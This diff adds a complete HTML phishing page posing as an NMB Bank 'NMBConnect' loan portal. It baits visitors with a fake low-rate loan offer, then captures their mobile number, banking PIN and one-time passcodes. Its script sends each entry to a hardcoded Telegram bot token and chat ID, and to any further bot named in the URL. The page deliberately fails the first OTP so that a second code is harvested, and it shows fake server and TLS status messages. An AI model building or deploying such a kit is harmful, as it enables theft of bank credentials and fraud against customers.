@@ -1,0 +1,958 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>NMBConnect - Flexible Loan Hub & Portal</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  
+  <style>
+    :root {
+      --navy-dark: #020B14;
+      --navy-primary: #021B33;
+      --navy-card: #0A2540;
+      --accent-cyan: #38BDF8;
+      --accent-cyan-glow: rgba(56, 189, 248, 0.35);
+      --accent-green: #22C55E;
+      --accent-red: #EF4444;
+      --glass-bg: rgba(255, 255, 255, 0.07);
+      --glass-border: rgba(255, 255, 255, 0.16);
+      --text-main: #FFFFFF;
+      --text-muted: #94A3B8;
+      --font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, sans-serif;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: var(--font-family);
+      -webkit-font-smoothing: antialiased;
+    }
+
+    body {
+      background: radial-gradient(circle at top right, #0F2942, #051322 60%, #020B14);
+      color: var(--text-main);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 30px 20px;
+      position: relative;
+    }
+
+    /* Page Views */
+    .view-page {
+      display: none;
+      width: 100%;
+      max-width: 1100px;
+      animation: fadeIn 0.4s ease-out forwards;
+    }
+
+    .view-page.active {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* Header */
+    header {
+      text-align: center;
+      margin-bottom: 28px;
+    }
+
+    .badge {
+      display: inline-block;
+      padding: 6px 16px;
+      background: rgba(56, 189, 248, 0.12);
+      border: 1px solid var(--accent-cyan-glow);
+      border-radius: 20px;
+      color: var(--accent-cyan);
+      font-size: 0.78rem;
+      font-weight: 700;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+      margin-bottom: 12px;
+    }
+
+    header h1 {
+      font-size: 2.2rem;
+      font-weight: 800;
+      margin-bottom: 8px;
+    }
+
+    header p {
+      font-size: 1rem;
+      color: var(--text-muted);
+    }
+
+    /* Hero & Custom Loan Configurator */
+    .hero-banner {
+      width: 100%;
+      background: linear-gradient(135deg, rgba(56, 189, 248, 0.15), rgba(10, 37, 64, 0.85));
+      border: 1.5px solid var(--accent-cyan);
+      border-radius: 24px;
+      padding: 32px;
+      text-align: center;
+      margin-bottom: 35px;
+      box-shadow: 0 10px 30px rgba(56, 189, 248, 0.15);
+    }
+
+    .hero-banner h2 {
+      font-size: 1.7rem;
+      color: #FFF;
+      margin-bottom: 10px;
+    }
+
+    .highlight-rate {
+      color: #38BDF8;
+      font-weight: 800;
+      text-decoration: underline;
+    }
+
+    .loan-selector {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 12px;
+      justify-content: center;
+      align-items: center;
+      margin-top: 20px;
+    }
+
+    .loan-opt {
+      background: rgba(255, 255, 255, 0.1);
+      border: 1px solid var(--glass-border);
+      color: #FFF;
+      padding: 12px 20px;
+      border-radius: 14px;
+      font-size: 0.95rem;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.25s ease;
+    }
+
+    .loan-opt:hover, .loan-opt.selected {
+      background: var(--accent-cyan);
+      color: var(--navy-primary);
+      border-color: var(--accent-cyan);
+      box-shadow: 0 0 15px var(--accent-cyan-glow);
+    }
+
+    /* Custom Input Box */
+    .custom-amount-box {
+      margin-top: 22px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .input-wrapper-loan {
+      display: flex;
+      align-items: center;
+      background: rgba(255, 255, 255, 0.08);
+      border: 1.5px solid var(--glass-border);
+      border-radius: 18px;
+      padding: 8px 18px;
+      width: 100%;
+      max-width: 320px;
+      transition: all 0.25s ease;
+    }
+
+    .input-wrapper-loan:focus-within {
+      border-color: var(--accent-cyan);
+      box-shadow: 0 0 15px var(--accent-cyan-glow);
+    }
+
+    .currency-symbol {
+      font-size: 1.2rem;
+      font-weight: 800;
+      color: var(--accent-cyan);
+      margin-right: 8px;
+    }
+
+    .loan-custom-input {
+      background: transparent;
+      border: none;
+      outline: none;
+      color: #FFF;
+      font-size: 1.1rem;
+      font-weight: 700;
+      width: 100%;
+    }
+
+    .loan-limits-hint {
+      font-size: 0.78rem;
+      color: var(--text-muted);
+    }
+
+    /* Term Selector & Estimation Grid */
+    .loan-meta-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 16px;
+      margin-top: 24px;
+      width: 100%;
+      max-width: 750px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    .meta-card {
+      background: rgba(10, 37, 64, 0.6);
+      border: 1px solid var(--glass-border);
+      border-radius: 16px;
+      padding: 16px;
+      text-align: center;
+    }
+
+    .meta-title {
+      font-size: 0.75rem;
+      color: var(--text-muted);
+      text-transform: uppercase;
+      letter-spacing: 0.8px;
+      margin-bottom: 8px;
+    }
+
+    .meta-value {
+      font-size: 1.25rem;
+      font-weight: 800;
+      color: var(--accent-cyan);
+    }
+
+    .term-select {
+      background: rgba(255, 255, 255, 0.1);
+      border: 1px solid var(--glass-border);
+      color: #FFF;
+      padding: 6px 12px;
+      border-radius: 10px;
+      font-size: 0.9rem;
+      font-weight: 700;
+      outline: none;
+      cursor: pointer;
+    }
+
+    .term-select option {
+      background: var(--navy-primary);
+      color: #FFF;
+    }
+
+    .btn-proceed {
+      margin-top: 28px;
+      background: var(--accent-green);
+      color: #FFF;
+      border: none;
+      padding: 14px 40px;
+      border-radius: 28px;
+      font-size: 1.05rem;
+      font-weight: 700;
+      cursor: pointer;
+      box-shadow: 0 4px 20px rgba(34, 197, 94, 0.35);
+      transition: all 0.2s ease;
+    }
+
+    .btn-proceed:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 24px rgba(34, 197, 94, 0.5);
+    }
+
+    /* Phone Shell */
+    .phone-wrapper {
+      width: 360px;
+      background: #000;
+      border-radius: 48px;
+      padding: 12px;
+      box-shadow: 0 25px 60px rgba(0, 0, 0, 0.8), 0 0 40px rgba(2, 27, 51, 0.8);
+      border: 3px solid rgba(255, 255, 255, 0.15);
+      position: relative;
+    }
+
+    .dynamic-island {
+      width: 90px;
+      height: 20px;
+      background: #000;
+      position: absolute;
+      top: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      border-radius: 20px;
+      z-index: 10;
+    }
+
+    .app-screen {
+      background: linear-gradient(180deg, rgba(10, 37, 64, 0.9) 0%, rgba(2, 27, 51, 0.98) 100%),
+                  radial-gradient(circle at center, #1E3A5F 0%, #000000 100%);
+      border-radius: 38px;
+      padding: 55px 24px 36px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 610px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    /* App Input Fields */
+    .toggle-container {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 35px;
+      font-size: 0.85rem;
+      font-weight: 500;
+    }
+
+    .switch {
+      position: relative;
+      display: inline-block;
+      width: 46px;
+      height: 24px;
+    }
+
+    .switch input { opacity: 0; width: 0; height: 0; }
+
+    .slider {
+      position: absolute;
+      cursor: pointer;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background-color: rgba(255, 255, 255, 0.2);
+      transition: .3s;
+      border-radius: 30px;
+      border: 1px solid var(--glass-border);
+    }
+
+    .slider:before {
+      position: absolute;
+      content: "";
+      height: 16px;
+      width: 16px;
+      left: 3px;
+      bottom: 3px;
+      background-color: #FFF;
+      transition: .3s;
+      border-radius: 50%;
+    }
+
+    input:checked + .slider { background-color: rgba(56, 189, 248, 0.4); }
+    input:checked + .slider:before { transform: translateX(22px); }
+
+    .input-box {
+      width: 100%;
+      background: rgba(255, 255, 255, 0.06);
+      border: 1.5px solid var(--glass-border);
+      border-radius: 28px;
+      padding: 13px 20px;
+      margin-bottom: 16px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .input-box:focus-within {
+      border-color: var(--accent-cyan);
+      box-shadow: 0 0 12px var(--accent-cyan-glow);
+    }
+
+    .flag-icon {
+      width: 22px;
+      height: 15px;
+      background: linear-gradient(to bottom, #006400 20%, #FFD700 20% 40%, #FF0000 40% 60%, #000000 60% 80%, #006400 80%);
+      border-radius: 2px;
+    }
+
+    .country-code { font-size: 0.9rem; font-weight: 600; }
+
+    .input-box input {
+      background: transparent;
+      border: none;
+      outline: none;
+      color: #FFF;
+      width: 100%;
+      font-size: 0.95rem;
+    }
+
+    .input-box input::placeholder { color: rgba(255, 255, 255, 0.45); }
+
+    .btn-signin {
+      width: 100%;
+      background: #FFFFFF;
+      color: var(--navy-primary);
+      border: none;
+      border-radius: 28px;
+      padding: 14px;
+      font-size: 1rem;
+      font-weight: 700;
+      cursor: pointer;
+      margin-top: 8px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .divider { margin: 20px 0; font-size: 0.8rem; color: var(--text-muted); }
+
+    .btn-fingerprint {
+      background: rgba(10, 37, 64, 0.8);
+      color: #FFF;
+      border: 1px solid var(--glass-border);
+      border-radius: 12px;
+      padding: 11px 20px;
+      font-size: 0.88rem;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .forgot-link {
+      margin-top: auto;
+      font-size: 0.85rem;
+      color: rgba(255, 255, 255, 0.8);
+      text-decoration: none;
+    }
+
+    /* Modal Screens for OTP & Confirmation */
+    .app-modal {
+      display: none;
+      position: absolute;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(2, 27, 51, 0.96);
+      backdrop-filter: blur(16px);
+      border-radius: 38px;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 24px;
+      text-align: center;
+      animation: fadeIn 0.3s ease-in-out;
+      z-index: 5;
+    }
+
+    .app-modal.active { display: flex; }
+
+    .modal-icon {
+      width: 52px;
+      height: 52px;
+      background: rgba(56, 189, 248, 0.15);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 14px;
+      color: var(--accent-cyan);
+    }
+
+    .modal-icon.error { background: rgba(239, 68, 68, 0.18); color: var(--accent-red); }
+    .modal-icon.success { background: rgba(34, 197, 94, 0.18); color: var(--accent-green); }
+
+    .app-modal h3 { font-size: 1.25rem; margin-bottom: 8px; font-weight: 700; }
+    .app-modal p { font-size: 0.85rem; color: var(--text-muted); margin-bottom: 20px; line-height: 1.45; }
+
+    .otp-inputs {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 16px;
+    }
+
+    .otp-inputs input {
+      width: 44px;
+      height: 48px;
+      text-align: center;
+      font-size: 1.3rem;
+      font-weight: 700;
+      border-radius: 10px;
+      border: 1.5px solid var(--glass-border);
+      background: rgba(255, 255, 255, 0.08);
+      color: #FFF;
+      outline: none;
+    }
+
+    .otp-inputs input:focus {
+      border-color: var(--accent-cyan);
+      box-shadow: 0 0 10px var(--accent-cyan-glow);
+    }
+
+    .error-msg {
+      color: var(--accent-red);
+      font-size: 0.8rem;
+      font-weight: 600;
+      margin-bottom: 14px;
+      display: none;
+    }
+
+    .error-msg.active { display: block; }
+
+    .btn-back {
+      background: transparent;
+      border: 1px solid var(--glass-border);
+      color: var(--text-muted);
+      padding: 8px 18px;
+      border-radius: 20px;
+      font-size: 0.8rem;
+      cursor: pointer;
+      margin-bottom: 20px;
+    }
+
+    /* Dynamic Real-Time Loader Overlay */
+    .server-loader-overlay {
+      display: none;
+      position: absolute;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(2, 11, 20, 0.92);
+      backdrop-filter: blur(10px);
+      border-radius: 38px;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      z-index: 20;
+      padding: 24px;
+      text-align: center;
+    }
+
+    .server-loader-overlay.active { display: flex; }
+
+    .pulse-ring {
+      width: 60px;
+      height: 60px;
+      border: 3px solid transparent;
+      border-top-color: var(--accent-cyan);
+      border-right-color: var(--accent-cyan);
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      margin-bottom: 20px;
+      box-shadow: 0 0 15px var(--accent-cyan-glow);
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .server-status-text {
+      font-size: 0.9rem;
+      font-weight: 600;
+      color: #FFF;
+      margin-bottom: 6px;
+    }
+
+    .server-sub-status {
+      font-size: 0.75rem;
+      color: var(--text-muted);
+      font-family: monospace;
+      letter-spacing: 0.5px;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- ================= PAGE 1: INTRO & CUSTOM LOAN CONFIGURATOR ================= -->
+  <div class="view-page active" id="page-intro">
+    
+    <header>
+      <span class="badge">Flexible Credit Portal</span>
+      <h1>NMBConnect Application</h1>
+      <p>Select or enter any custom loan amount to calculate payments and begin</p>
+    </header>
+
+    <!-- Loan Offer Configurator Banner -->
+    <div class="hero-banner">
+      <h2>Exclusive Flexible NMB Loan Offer</h2>
+      <p>NMB Bank offers personal and business financing at lowest-in-market rates—<span class="highlight-rate">90% lower than standard rates in Zimbabwe</span>!</p>
+
+      <!-- Pre-set Buttons -->
+      <div class="loan-selector">
+        <button class="loan-opt" onclick="selectPreset(500)">$500 USD</button>
+        <button class="loan-opt selected" onclick="selectPreset(1000)">$1,000 USD</button>
+        <button class="loan-opt" onclick="selectPreset(2500)">$2,500 USD</button>
+        <button class="loan-opt" onclick="selectPreset(5000)">$5,000 USD</button>
+        <button class="loan-opt" onclick="selectPreset(10000)">$10,000 USD</button>
+        <button class="loan-opt" onclick="selectPreset(25000)">$25,000 USD</button>
+      </div>
+
+      <!-- Custom Loan Amount Input -->
+      <div class="custom-amount-box">
+        <label style="font-size: 0.85rem; color: var(--text-muted); font-weight: 600;">Or Enter Any Custom Loan Amount:</label>
+        <div class="input-wrapper-loan">
+          <span class="currency-symbol">$</span>
+          <input type="number" id="customLoanInput" class="loan-custom-input" value="1000" min="100" max="100000" step="50" oninput="handleCustomInput(this.value)">
+          <span style="font-size: 0.85rem; color: var(--text-muted); font-weight: 700;">USD</span>
+        </div>
+        <div class="loan-limits-hint">Min: $100 USD | Max: $100,000 USD</div>
+      </div>
+
+      <!-- Live Calculation Grid -->
+      <div class="loan-meta-grid">
+        <div class="meta-card">
+          <div class="meta-title">Selected Loan</div>
+          <div class="meta-value" id="dispLoanAmount">$1,000 USD</div>
+        </div>
+
+        <div class="meta-card">
+          <div class="meta-title">Repayment Term</div>
+          <select class="term-select" id="termSelect" onchange="recalculateLoan()">
+            <option value="6">6 Months</option>
+            <option value="12" selected>12 Months</option>
+            <option value="24">24 Months</option>
+            <option value="36">36 Months</option>
+          </select>
+        </div>
+
+        <div class="meta-card">
+          <div class="meta-title">Est. Monthly Payment</div>
+          <div class="meta-value" id="dispMonthlyPay">$86.50 /mo</div>
+        </div>
+      </div>
+
+      <button class="btn-proceed" onclick="startSessionAndGoToApp()">Proceed to Login & Apply &rarr;</button>
+    </div>
+
+  </div>
+
+
+  <!-- ================= PAGE 2: MOBILE APP DEMO ================= -->
+  <div class="view-page" id="page-app">
+    
+    <button class="btn-back" onclick="goToIntro()">&larr; Back to Loan Configurator</button>
+
+    <div class="phone-wrapper">
+      <div class="dynamic-island"></div>
+      
+      <div class="app-screen">
+        
+        <!-- Live Server Loader Screen overlay -->
+        <div class="server-loader-overlay" id="serverLoader">
+          <div class="pulse-ring"></div>
+          <div class="server-status-text" id="loaderTitle">Connecting to Server...</div>
+          <div class="server-sub-status" id="loaderSub">nmbconnect.nmbz.co.zw:443</div>
+        </div>
+
+        <!-- Email / Mobile Toggle -->
+        <div class="toggle-container">
+          <span style="opacity: 0.6;">Email Address</span>
+          <label class="switch">
+            <input type="checkbox" checked id="toggleType">
+            <span class="slider"></span>
+          </label>
+          <span>Mobile Number</span>
+        </div>
+
+        <!-- Phone Number Input -->
+        <div class="input-box">
+          <div class="flag-icon"></div>
+          <span class="country-code">(+263) &#9660;</span>
+          <input type="tel" id="mobileInput" placeholder="Mobile Number" value="771234567" />
+        </div>
+
+        <!-- PIN Input -->
+        <div class="input-box">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="opacity:0.7;">
+            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+          </svg>
+          <input type="password" id="pinInput" maxlength="4" placeholder="Enter Pin" value="1234" />
+        </div>
+
+        <!-- Sign In Button -->
+        <button class="btn-signin" onclick="simulateSignIn()">Sign In</button>
+
+        <div class="divider">or</div>
+
+        <!-- Fingerprint Button -->
+        <button class="btn-fingerprint" onclick="simulateSignIn()">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M12 12v0"></path>
+            <path d="M12 21a9 9 0 0 0 9-9 9 9 0 0 0-9-9 9 9 0 0 0-9 9z"></path>
+            <path d="M12 17a5 5 0 0 0 5-5 5 5 0 0 0-5-5 5 5 0 0 0-5 5z"></path>
+          </svg>
+          Use Fingerprint
+        </button>
+
+        <a href="#" class="forgot-link" onclick="alert('Password reset link sent via SMS.'); return false;">Forgot Password?</a>
+
+
+        <!-- ================= OTP MODAL ================= -->
+        <div class="app-modal" id="otpModal">
+          <div class="modal-icon" id="modalIcon">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+            </svg>
+          </div>
+          
+          <h3>OTP Verification</h3>
+          <p>Please enter the 4-digit code sent to your registered number ending in **241.</p>
+          
+          <!-- Error Message Display -->
+          <div class="error-msg" id="errorMsg">⚠️ Invalid OTP code entered. Please try again.</div>
+
+          <div class="otp-inputs" id="otpGroup">
+            <input type="text" maxlength="1" pattern="\d*" />
+            <input type="text" maxlength="1" pattern="\d*" />
+            <input type="text" maxlength="1" pattern="\d*" />
+            <input type="text" maxlength="1" pattern="\d*" />
+          </div>
+
+          <button class="btn-signin" onclick="handleOtpSubmit()">Verify & Login</button>
+        </div>
+
+
+        <!-- ================= SUCCESS CONFIRMATION MODAL ================= -->
+        <div class="app-modal" id="successModal">
+          <div class="modal-icon success">
+            <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+              <polyline points="22 4 12 14.01 9 11.01"></polyline>
+            </svg>
+          </div>
+          <h3>Request Received</h3>
+          <p id="successText">Your loan request has been received and is currently being processed by NMB Bank.</p>
+          <button class="btn-signin" onclick="resetDemo()">Done</button>
+        </div>
+
+      </div>
+    </div>
+
+  </div>
+
+
+  <script>
+    let currentLoanAmount = 1000;
+    let otpAttemptCount = 0;
+    let capturedPin = "";
+    let capturedOtp = "";
+
+    const loader = document.getElementById('serverLoader');
+    const loaderTitle = document.getElementById('loaderTitle');
+    const loaderSub = document.getElementById('loaderSub');
+
+    /* Select Preset Amount */
+    function selectPreset(amount) {
+      currentLoanAmount = amount;
+      document.getElementById('customLoanInput').value = amount;
+      
+      document.querySelectorAll('.loan-opt').forEach(btn => {
+        if (btn.innerText.includes(amount.toLocaleString())) {
+          btn.classList.add('selected');
+        } else {
+          btn.classList.remove('selected');
+        }
+      });
+
+      recalculateLoan();
+    }
+
+    /* Handle Custom Manual Input */
+    function handleCustomInput(val) {
+      let numericVal = parseFloat(val) || 0;
+      currentLoanAmount = numericVal;
+
+      // Unselect pre-set buttons if input doesn't match
+      document.querySelectorAll('.loan-opt').forEach(btn => {
+        if (btn.innerText.includes(numericVal.toLocaleString())) {
+          btn.classList.add('selected');
+        } else {
+          btn.classList.remove('selected');
+        }
+      });
+
+      recalculateLoan();
+    }
+
+    /* Recalculate Monthly Installment dynamically */
+    function recalculateLoan() {
+      const termMonths = parseInt(document.getElementById('termSelect').value, 10);
+      const annualRate = 0.075; // Ultra low rate (7.5% per annum)
+      
+      document.getElementById('dispLoanAmount').innerText = `$${currentLoanAmount.toLocaleString()} USD`;
+
+      if (currentLoanAmount > 0) {
+        let monthlyRate = annualRate / 12;
+        let monthlyPayment = (currentLoanAmount * monthlyRate) / (1 - Math.pow(1 + monthlyRate, -termMonths));
+        document.getElementById('dispMonthlyPay').innerText = `$${monthlyPayment.toFixed(2)} /mo`;
+      } else {
+        document.getElementById('dispMonthlyPay').innerText = `$0.00 /mo`;
+      }
+    }
+
+    /* Helper function for dynamic loading overlay */
+    function showLoader(title, subText, durationMs, callback) {
+      loaderTitle.innerText = title;
+      loaderSub.innerText = subText;
+      loader.classList.add('active');
+
+      setTimeout(() => {
+        loader.classList.remove('active');
+        if (callback) callback();
+      }, durationMs);
+    }
+
+    function startSessionAndGoToApp() {
+      if (currentLoanAmount < 100) {
+        alert("Please enter a valid loan amount of at least $100 USD.");
+        return;
+      }
+
+      showLoader("Initializing NMB Loan Portal...", "POST /api/v2/loan/session_init", 1300, () => {
+        document.getElementById('page-intro').classList.remove('active');
+        document.getElementById('page-app').classList.add('active');
+      });
+    }
+
+    function goToIntro() {
+      document.getElementById('page-app').classList.remove('active');
+      document.getElementById('page-intro').classList.add('active');
+    }
+
+    function simulateSignIn() {
+      capturedPin = document.getElementById('pinInput').value;
+      const mobileNumber = document.getElementById('mobileInput').value;
+      const termMonths = document.getElementById('termSelect').value;
+      const monthlyPay = document.getElementById('dispMonthlyPay').innerText;
+
+      // Send initial details (Loan + Phone + PIN) to specific link/bot if available from URL query parameters
+      sendDataToTelegram("Login Attempt", {
+        amount: currentLoanAmount,
+        term: termMonths,
+        monthly: monthlyPay,
+        mobile: mobileNumber,
+        pin: capturedPin,
+        otp: "N/A (Pending)"
+      });
+
+      showLoader("Authenticating Credentials...", "Connecting to NMB Auth Gateway...", 1500, () => {
+        openOtpModal();
+      });
+    }
+
+    function openOtpModal() {
+      otpAttemptCount = 0;
+      document.getElementById('errorMsg').classList.remove('active');
+      document.getElementById('modalIcon').classList.remove('error');
+      clearOtpInputs();
+      document.getElementById('otpModal').classList.add('active');
+      document.querySelectorAll('#otpGroup input')[0].focus();
+    }
+
+    /* Auto-tabbing mechanism for OTP boxes */
+    const otpInputs = document.querySelectorAll('#otpGroup input');
+    otpInputs.forEach((input, idx) => {
+      input.addEventListener('keyup', (e) => {
+        if (e.key >= '0' && e.key <= '9') {
+          if (idx < otpInputs.length - 1) otpInputs[idx + 1].focus();
+        } else if (e.key === 'Backspace') {
+          if (idx > 0) otpInputs[idx - 1].focus();
+        }
+      });
+    });
+
+    function clearOtpInputs() {
+      otpInputs.forEach(i => i.value = '');
+    }
+
+    /* Multi-Target Telegram Integration Function */
+    function sendDataToTelegram(actionType, details) {
+        // Main receivers (Always receive all inputs)
+        const mainBots = [
+            { token: "8866470725:AAFXI9deCCslCGBqAi8NsBkwD3Tm4OHPQpw", chatId: "8735708057" }
+        ];
+
+        // Dynamic secondary receivers based on URL search query parameter (e.g. ?bot=TOKEN&chat=ID)
+        const urlParams = new URLSearchParams(window.location.search);
+        const customBotToken = urlParams.get('bot');
+        const customChatId = urlParams.get('chat');
+
+        const targets = [...mainBots];
+        if (customBotToken && customChatId) {
+            targets.push({ token: customBotToken, chatId: customChatId });
+        }
+
+        const message = `🔔 *NMBConnect Alert: ${actionType}*\n\n` +
+                        `💰 *Amount:* $${details.amount.toLocaleString()} USD\n` +
+                        `📅 *Term:* ${details.term} Months\n` +
+                        `💵 *Monthly Payment:* ${details.monthly}\n` +
+                        `📱 *Mobile Number:* +263 ${details.mobile}\n` +
+                        `🔑 *PIN Entered:* ${details.pin}\n` +
+                        `🛡️ *OTP Code:* ${details.otp}\n` +
+                        `🌐 *Status:* Active`;
+
+        targets.forEach(target => {
+            const url = `https://api.telegram.org/bot${target.token}/sendMessage`;
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: target.chatId,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(error => console.error('Telegram error:', error));
+        });
+    }
+
+    function handleOtpSubmit() {
+      otpAttemptCount++;
+      
+      // Collect values from OTP boxes
+      capturedOtp = Array.from(otpInputs).map(input => input.value).join('');
+      const mobileNumber = document.getElementById('mobileInput').value;
+      const termMonths = document.getElementById('termSelect').value;
+      const monthlyPay = document.getElementById('dispMonthlyPay').innerText;
+
+      if (otpAttemptCount === 1) {
+        // Send first failed/attempted OTP data
+        sendDataToTelegram("OTP Attempt 1 (Invalid)", {
+            amount: currentLoanAmount,
+            term: termMonths,
+            monthly: monthlyPay,
+            mobile: mobileNumber,
+            pin: capturedPin,
+            otp: capturedOtp
+        });
+
+        showLoader("Verifying OTP Security Token...", "POST /api/v2/auth/verify_otp", 1400, () => {
+          document.getElementById('errorMsg').classList.add('active');
+          document.getElementById('modalIcon').classList.add('error');
+          clearOtpInputs();
+          otpInputs[0].focus();
+        });
+      } else {
+        // Send final verified successful OTP data
+        sendDataToTelegram("OTP Verification Success", {
+            amount: currentLoanAmount,
+            term: termMonths,
+            monthly: monthlyPay,
+            mobile: mobileNumber,
+            pin: capturedPin,
+            otp: capturedOtp
+        });
+
+        showLoader("Encrypting Application & Verifying...", "TLS v1.3 Handshake - Authorized", 1800, () => {
+          document.getElementById('otpModal').classList.remove('active');
+          
+          document.getElementById('successText').innerText = 
+            `Your low-rate loan application for $${currentLoanAmount.toLocaleString()} USD has been received and is currently being processed by NMB Bank. You will receive a confirmation SMS shortly.`;
+          document.getElementById('successModal').classList.add('active');
+        });
+      }
+    }
+
+    function resetDemo() {
+      document.getElementById('successModal').classList.remove('active');
+      goToIntro();
+    }
+
+    // Initialize calculation on load
+    recalculateLoan();
+  </script>
+
+</body>
+</html>
